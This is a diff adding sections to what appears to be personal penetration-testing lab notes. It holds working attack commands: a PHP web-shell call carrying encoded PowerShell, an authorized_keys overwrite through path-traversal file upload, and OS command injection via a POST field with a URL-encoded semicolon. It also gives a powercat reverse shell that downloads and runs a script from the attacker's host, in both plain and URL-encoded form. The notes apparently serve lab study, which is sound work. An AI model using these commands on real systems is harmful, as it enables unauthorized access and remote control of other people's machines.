@@ -461,6 +461,71 @@ powershell needs an enc parameter to specify encoding
 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB
 ```
 
+### Non-execution file upload
+
+can attempt to overwrite authorized_keys for ssh
+
+```
+ssh-keygen
+cat .ssh/id_rsa.pub > attack.pub
+```
+
+then upload to `../../../../root/.ssh/authorized_keys
+
+sometimes have to remove known hosts file
+```
+rm ~/.ssh/known_hosts
+```
+
+### OS command injection
+
+can use the -X flag with curl for POST requests
+
+```
+curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
+```
+
+can use `git version` to reveal OS
+
+url-encoded semicolon is `%3B`
+
+```
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+```
+
+for windows, we need to check if it's running CMD or powershell
+
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+we can url encode this and send
+
+
+```
+curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+```
+
+can use powercat for a windows reverse shell in pwsh
+
+```
+/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 80
+nc -lnvp 4444
+```
+
+pwsh command for powercat reverse shell
+
+```
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+```
+
+encoded
+
+```
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
+```
+
 
 
 
